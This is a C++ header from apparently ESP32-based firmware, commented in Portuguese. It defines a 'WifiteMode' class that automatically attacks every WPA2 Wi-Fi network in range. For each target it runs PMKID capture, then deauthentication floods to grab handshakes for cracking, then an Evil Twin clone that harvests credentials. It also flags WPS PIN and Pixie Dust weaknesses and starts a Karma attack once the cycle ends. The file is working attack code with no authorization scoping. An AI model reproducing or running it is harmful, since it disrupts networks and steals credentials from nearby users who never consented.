#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "scanner.h"
#include "deauth.h"
#include "sniffer.h"
#include "pmkid_fisher.h"
#include "karma.h"
#include "evil_twin.h"
#include "wps_scanner.h"

/*
 * WifiteMode — Orquestrador de ataques automático estilo wifite
 *
 * Estratégia por alvo (prioridade):
 *   1. WPS PIN vuln  → flag para ataque manual (ESP32 sem suporte EAP completo)
 *   2. PMKID Fisher  → 30s por alvo (sem precisar de clientes)
 *   3. Deauth + HS   → 60s deauth broadcast, aguarda handshake
 *   4. Evil Twin     → último recurso (alvo com RSSI forte)
 *
 * Fluxo:
 *   IDLE → SCANNING → PMKID_PHASE → DEAUTH_PHASE → EVIL_TWIN_PHASE → DONE
 */
class WifiteMode {
public:
    static WifiteMode& get() { static WifiteMode inst; return inst; }

    enum State {
        IDLE, SCANNING, PMKID_PHASE, DEAUTH_PHASE, EVIL_TWIN_PHASE, DONE
    };

    struct WTarget {
        String   bssid, ssid;
        uint8_t  bssidRaw[6];
        uint8_t  channel;
        int8_t   rssi;
        uint8_t  auth;        // wifi_auth_mode_t cast
        bool     hasWPS;
        bool     wpsPIN;
        bool     pixieDust;   // WPS pixie dust candidato
        // Resultados
        bool     pmkidCaptured  = false;
        bool     hsCaptured     = false;
        bool     credsCapt      = false;
        uint8_t  deauthRounds   = 0;
        uint8_t  pmkidAttempts  = 0;
        uint8_t  maxDeauthRetry = 2; // retry deauth antes de ET
        bool     skipped        = false;
    };

    State               state      = IDLE;
    bool                running    = false;
    size_t              curIdx     = 0;
    unsigned long       phaseStart = 0;
    std::vector<WTarget> targets;

    // Configurações
    uint8_t  minRSSI       = 70;  // magnitude: ignora rssi < -minRSSI
    uint32_t pmkidTimeoutMs = 30000;
    uint32_t deauthTimeoutMs = 60000;
    uint32_t etTimeoutMs    = 120000;
    bool     skipWeak       = true;   // pula APs com RSSI < -85

    void start() {
        auto& aps = WiFiScanner::get().aps();
        if (aps.empty()) { LOG.warn("[WIFITE] Faça um scan WiFi primeiro"); return; }
        targets.clear();
        for (auto& ap : aps) {
            if ((int)ap.auth < 3) continue; // só WPA2+
            if (skipWeak && ap.rssi < -(int)minRSSI) {
                LOG.data("[WIFITE] Pulando " + ap.ssid + " (rssi=" + String(ap.rssi) + ")");
                continue;
            }
            uint8_t mac[6];
            sscanf(ap.bssidStr.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
            // Não atacar a si mesmo
            uint8_t apM[6]; esp_wifi_get_mac(WIFI_IF_AP, apM);
            if (memcmp(mac, apM, 6) == 0) continue;

            WTarget t;
            t.bssid   = ap.bssidStr;
            t.ssid    = ap.ssid;
            memcpy(t.bssidRaw, mac, 6);
            t.channel = ap.channel;
            t.rssi    = (int8_t)ap.rssi;
            t.auth    = (uint8_t)ap.auth;
            t.hasWPS    = ap.wps;
            t.wpsPIN    = false;
            t.pixieDust = false;
            // Adaptive retry: sinais mais fortes têm mais tentativas de deauth
            t.maxDeauthRetry = (ap.rssi > -65) ? 3 : (ap.rssi > -75) ? 2 : 1;
            targets.push_back(t);
        }
        // Verifica WPS nos resultados do WPSScanner
        for (auto& wt : targets) {
            for (auto& wr : WPSScanner::get().results) {
                if (wr.bssid == wt.bssid) {
                    wt.hasWPS = true;
                    wt.wpsPIN    = wr.pinEnabled && !wr.locked;
                    wt.pixieDust = wr.pixieDustVuln && !wr.locked;
                    break;
                }
            }
        }
        // Ordena: RSSI mais forte primeiro, WPS PIN prioritário
        std::sort(targets.begin(), targets.end(), [](const WTarget& a, const WTarget& b){
            if (a.wpsPIN != b.wpsPIN) return a.wpsPIN > b.wpsPIN;
            return a.rssi > b.rssi;
        });

        if (targets.empty()) { LOG.warn("[WIFITE] Nenhum alvo WPA2 elegível"); return; }

        running   = true;
        curIdx    = 0;
        state     = PMKID_PHASE;
        phaseStart = millis();

        Deauther::get().stop();
        PMKIDFisher::get().stop();
        Sniffer::get().stop();
        Sniffer::get().start();

        LOG.warn("[WIFITE] Iniciado — " + String(targets.size()) + " alvos | ordem: PMKID → Deauth → ET");
        _startPmkidPhase();
    }

    void stop() {
        running = false;
        state   = IDLE;
        Deauther::get().stop();
        PMKIDFisher::get().stop();
        KarmaAttack::get().stop();
        if (EvilTwin::get().running) EvilTwin::get().stop();
        LOG.info("[WIFITE] Parado. Resultados:");
        for (auto& t : targets) {
            String res = "  " + t.ssid + " [" + t.bssid + "]: ";
            if (t.pmkidCaptured) res += "PMKID-OK ";
            if (t.hsCaptured)    res += "HS-OK ";
            if (t.credsCapt)     res += "CREDS-OK ";
            if (!t.pmkidCaptured && !t.hsCaptured && !t.credsCapt) res += "sem resultado";
            LOG.data(res);
        }
    }

    void tick() {
        if (!running || targets.empty()) return;
        if (curIdx >= targets.size()) { _finish(); return; }

        WTarget& cur = targets[curIdx];
        unsigned long elapsed = millis() - phaseStart;

        switch (state) {
            case PMKID_PHASE:
                _checkPmkidResult(cur);
                if (cur.pmkidCaptured) {
                    LOG.success("[WIFITE] " + cur.ssid + " → PMKID capturado!");
                    _nextTarget();
                    return;
                }
                {
                    // Timeout adaptativo: APs mais próximos respondem mais rápido
                    uint32_t tmo = (cur.rssi > -55) ? pmkidTimeoutMs / 2 :
                                   (cur.rssi > -70) ? pmkidTimeoutMs :
                                                      pmkidTimeoutMs + 15000;
                    if (elapsed > tmo) {
                        cur.pmkidAttempts++;
                        PMKIDFisher::get().stop();
                        LOG.info("[WIFITE] PMKID timeout (" + String(cur.pmkidAttempts) +
                                 ") para " + cur.ssid + " → Deauth phase");
                        state = DEAUTH_PHASE;
                        phaseStart = millis();
                        _startDeauthPhase(cur);
                    }
                }
                break;

            case DEAUTH_PHASE:
                _checkHandshakeResult(cur);
                if (cur.hsCaptured) {
                    LOG.success("[WIFITE] " + cur.ssid + " → Handshake capturado!");
                    Deauther::get().stop();
                    _nextTarget();
                    return;
                }
                {
                    // Timeout adaptativo baseado em RSSI
                    uint32_t dtmo = (cur.rssi > -55) ? deauthTimeoutMs / 2 :
                                    (cur.rssi > -70) ? deauthTimeoutMs :
                                                       deauthTimeoutMs + 20000;
                    if (elapsed > dtmo) {
                        cur.deauthRounds++;
                        Deauther::get().stop();
                        if (cur.deauthRounds < cur.maxDeauthRetry) {
                            // Retry deauth: intensidade cresce a cada round
                            Deauther::get().intensity = min(2u, (unsigned)cur.deauthRounds);
                            LOG.info("[WIFITE] Deauth retry " + String(cur.deauthRounds) +
                                     "/" + String(cur.maxDeauthRetry) + " para " + cur.ssid);
                            phaseStart = millis();
                            _startDeauthPhase(cur);
                        } else if (cur.rssi > -80) {
                            LOG.info("[WIFITE] Deauth esgotado → Evil Twin para " + cur.ssid);
                            state = EVIL_TWIN_PHASE;
                            phaseStart = millis();
                            _startEvilTwinPhase(cur);
                        } else {
                            LOG.info("[WIFITE] Sem resultado para " + cur.ssid + " (sinal fraco) → próximo");
                            _nextTarget();
                        }
                    }
                }
                break;

            case EVIL_TWIN_PHASE:
                if ((int)EvilTwin::get().captured.size() > 0) {
                    cur.credsCapt = true;
                    LOG.success("[WIFITE] " + cur.ssid + " → Credenciais via Evil Twin!");
                    EvilTwin::get().stop();
                    Deauther::get().stop();
                    _nextTarget();
                    return;
                }
                if (elapsed > etTimeoutMs) {
                    EvilTwin::get().stop();
                    Deauther::get().stop();
                    LOG.info("[WIFITE] ET timeout → próximo alvo");
                    _nextTarget();
                }
                break;

            default: break;
        }
    }

    // Retorna JSON de status para o front-end
    String statusJson() {
        String j = "{\"running\":" + String(running ? "true" : "false");
        j += ",\"state\":" + String((int)state);
        j += ",\"cur\":" + String(curIdx);
        j += ",\"total\":" + String(targets.size());
        j += ",\"targets\":[";
        for (size_t i = 0; i < targets.size(); i++) {
            auto& t = targets[i];
            if (i) j += ",";
            j += "{\"ssid\":\"" + _esc(t.ssid) + "\"";
            j += ",\"bssid\":\"" + t.bssid + "\"";
            j += ",\"rssi\":" + String(t.rssi);
            j += ",\"ch\":" + String(t.channel);
            j += ",\"wps\":" + String(t.hasWPS ? "true" : "false");
            j += ",\"wpsPIN\":" + String(t.wpsPIN ? "true" : "false");
            j += ",\"pixie\":" + String(t.pixieDust ? "true" : "false");
            j += ",\"pmkid\":" + String(t.pmkidCaptured ? "true" : "false");
            j += ",\"hs\":" + String(t.hsCaptured ? "true" : "false");
            j += ",\"creds\":" + String(t.credsCapt ? "true" : "false");
            j += ",\"active\":" + String(i == curIdx && running ? "true" : "false");
            j += "}";
        }
        j += "]}";
        return j;
    }

private:
    void _startPmkidPhase() {
        if (curIdx >= targets.size()) return;
        WTarget& t = targets[curIdx];
        PMKIDFisher::get().clearTargets();
        PMKIDFisher::get().addTarget(t.bssidRaw, t.ssid.c_str(), t.channel, t.rssi);
        PMKIDFisher::get().start();
        state      = PMKID_PHASE;
        phaseStart = millis();
        LOG.warn("[WIFITE] [" + String(curIdx+1) + "/" + String(targets.size()) + "] "
                 + t.ssid + " → PMKID phase (30s)");
        if (t.wpsPIN)
            LOG.warn("[WIFITE] !! WPS PIN vulneravel em " + t.ssid + " — ataque manual disponível");
        if (t.pixieDust)
            LOG.warn("[WIFITE] !! Pixie Dust candidato: " + t.ssid + " — chipset potencialmente vulnerável");
    }

    void _startDeauthPhase(WTarget& t) {
        // Deauth broadcast neste AP específico
        Deauther::get().start(t.bssidRaw, nullptr, t.channel, false);
        // Sniffer travado no canal do alvo para capturar HS
        Sniffer::get().lockChannel(t.channel);
        LOG.warn("[WIFITE] [" + String(curIdx+1) + "/" + String(targets.size()) + "] "
                 + t.ssid + " → Deauth+HS phase (60s) ch" + String(t.channel));
    }

    void _startEvilTwinPhase(WTarget& t) {
        // Para sniffer antes (conflito de promiscuous com ET)
        Sniffer::get().stop();
        // Deauth contínuo para forçar desconexão do AP real
        Deauther::get().start(t.bssidRaw, nullptr, t.channel, false);
        // Clona AP
        EvilTwin::get().start(t.ssid, t.channel);
        LOG.warn("[WIFITE] [" + String(curIdx+1) + "/" + String(targets.size()) + "] "
                 + t.ssid + " → Evil Twin phase (120s)");
    }

    void _checkPmkidResult(WTarget& t) {
        for (auto& p : Sniffer::get().pmkids) {
            if (p.bssid == t.bssid) { t.pmkidCaptured = true; return; }
        }
    }

    void _checkHandshakeResult(WTarget& t) {
        for (auto& hs : Sniffer::get().handshakeStates) {
            if (hs.bssid == t.bssid && (hs.crackable() || hs.complete())) {
                t.hsCaptured = true; return;
            }
        }
    }

    void _nextTarget() {
        Deauther::get().stop();
        PMKIDFisher::get().stop();
        if (EvilTwin::get().running) EvilTwin::get().stop();
        Sniffer::get().resumeHop();
        curIdx++;
        if (curIdx >= targets.size()) { _finish(); return; }
        phaseStart = millis();
        _startPmkidPhase();
    }

    void _finish() {
        running = false;
        state   = DONE;
        uint32_t pmkids = 0, hs = 0, creds = 0;
        for (auto& t : targets) {
            if (t.pmkidCaptured) pmkids++;
            if (t.hsCaptured)    hs++;
            if (t.credsCapt)     creds++;
        }
        LOG.success("[WIFITE] Concluído! PMKID:" + String(pmkids) +
                    " HS:" + String(hs) + " Creds:" + String(creds) +
                    " de " + String(targets.size()) + " alvos");
        KarmaAttack::get().start(); // Karma ativo após ciclo completo
    }

    static String _esc(const String& s) {
        String r = s; r.replace("\"","\\\""); return r;
    }
};
